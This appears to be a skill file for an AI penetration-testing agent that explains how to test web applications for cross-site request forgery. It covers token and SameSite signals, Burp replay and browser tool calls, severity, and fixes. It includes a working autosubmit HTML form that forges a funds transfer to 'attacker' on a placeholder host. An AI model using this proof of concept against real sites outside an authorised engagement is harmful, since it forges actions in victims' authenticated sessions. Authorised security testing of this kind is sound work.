---
name: testing-csrf
description: Test for OWASP A01 CSRF — missing anti-CSRF tokens, SameSite misconfiguration, GET-based state changes.
---

## When to use

Prerequisite skills: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-sitemap-crawl`, `mcp-burp`, `mcp-browser`.

Use this skill when the app has state-changing endpoints (POST, PUT, DELETE) triggered from authenticated sessions. CSRF testing is relevant any time user actions modify server-side state and the application relies on cookie-based authentication without a secondary verification mechanism.

## Signal to look for

- State-changing endpoints that do not include an `X-CSRF-Token` header (or equivalent `csrf_token` field) in the request.
- Cookies set without `SameSite=Lax` or `SameSite=Strict`; a missing or `SameSite=None` flag leaves session cookies eligible for cross-site submission.
- GET endpoints that perform state changes (account deletion, password reset initiation, balance transfers) — these are trivially exploitable regardless of CSRF token presence.

## Test steps

1. Capture a state-changing request (POST, PUT, DELETE) using Burp proxy while authenticated.
2. Remove the CSRF token parameter and/or the `Referer` header; replay the modified request via `burp_repeater_send`.
3. If the replay still succeeds (HTTP 200 or expected state-change response): craft a PoC HTML page with `<form action="..." method="POST">` and an autosubmit script.
4. Host the PoC locally (e.g., write to `/tmp/csrf-poc.html`); navigate to it via `browser_navigate` with the target session active in the same browser profile.
5. Confirm that the state change occurred via `browser_snapshot` and, where possible, server-side verification (re-fetch the affected resource and check the new state).
6. Capture all evidence per `methodology-evidence-capture`.

## Tool commands

**Shell — Manual PoC HTML:**

```html
<form action="https://target.example.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="100">
</form>
<script>document.forms[0].submit()</script>
```

(Burp Pro alternative: right-click the captured request → Engagement tools → Generate CSRF PoC.)

**MCP — replay without CSRF token:**

```
burp_repeater_send(raw_base64=<b64 without CSRF token>, host="target.example.com", port=443, secure=true, tab_name="csrf-probe")
```

Expected envelope on success:

```json
{"ok": true, "status": 200, "body": "..."}
```

**MCP — deliver PoC and confirm:**

```
browser_navigate(url="file:///tmp/csrf-poc.html")
browser_snapshot()
```

Expected envelope:

```json
{"ok": true, "snapshot": "..."}
```

## Interpret results

A cross-origin request that succeeds without a valid CSRF token confirms the vulnerability. In limited cases the request succeeds only when the session cookie carries `SameSite=None` and the server's CORS policy is permissive (i.e., returns `Access-Control-Allow-Origin` matching the attacker origin). Check `Set-Cookie` flags in `burp_proxy_history` to understand the SameSite state of the session cookie before drawing conclusions about exploitability in modern browsers.

## Finding writeup

- **Title:** `CSRF on <endpoint>` (e.g., `CSRF on POST /api/transfer`).
- **Severity:** Sensitive state change (fund transfer, profile update) = High; authentication or role change (password reset, privilege escalation) = Critical.
- **Evidence** per `methodology-evidence-capture`: the crafted PoC HTML file, the replayed request that succeeded without a CSRF token, and the server response confirming the state change.
- **Fix:** Implement the synchronizer-token pattern (unique per-session or per-request token validated server-side); set `SameSite=Lax` as the default for session cookies; consider the double-submit cookie pattern as a stateless alternative; enforce `Origin` or `Referer` header checks as a defense-in-depth layer.

## References

- OWASP WSTG SESS-05: `https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery`
- PortSwigger CSRF: `https://portswigger.net/web-security/csrf`
- CWE-352: `https://cwe.mitre.org/data/definitions/352.html`

## Scope

This skill operates within the engagement scope established by
`methodology-scoping` and `methodology-rules-of-engagement`. Targets are
constrained mechanically via `burp_scope_check`; hosts outside Burp scope are
not tested.
